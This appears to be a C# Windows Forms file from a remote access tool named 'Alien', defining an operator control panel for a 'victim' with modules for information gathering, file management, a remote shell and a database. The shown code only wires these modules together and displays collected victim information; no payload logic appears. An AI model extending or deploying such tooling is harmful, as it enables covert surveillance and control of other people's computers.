using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Alien
{
    public partial class frmControlPanel : Form
    {
        private clsVictim m_victim { get; set; }

        private clsInfoSpyder m_infoSpyder { get; set; }
        private clsfnFileMgr m_fileMgr { get; set; }
        private clsfnShell m_rShell { get; set; }
        private clsfnDb m_dbMgr { get; set; }

        public frmControlPanel(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;

            m_infoSpyder = new clsInfoSpyder(victim);
            m_fileMgr = new clsfnFileMgr(victim);
            m_rShell = new clsfnShell(victim);
            m_dbMgr = new clsfnDb(victim, "db.sqlite");
        }

        void fnValidator()
        {

        }

        async void fnSetup()
        {
            richTextBox1.Text = m_infoSpyder.fnszGetInfo();
        }

        private void frmControlPanel_Load(object sender, EventArgs e)
        {
            fnSetup();
        }
    }
}
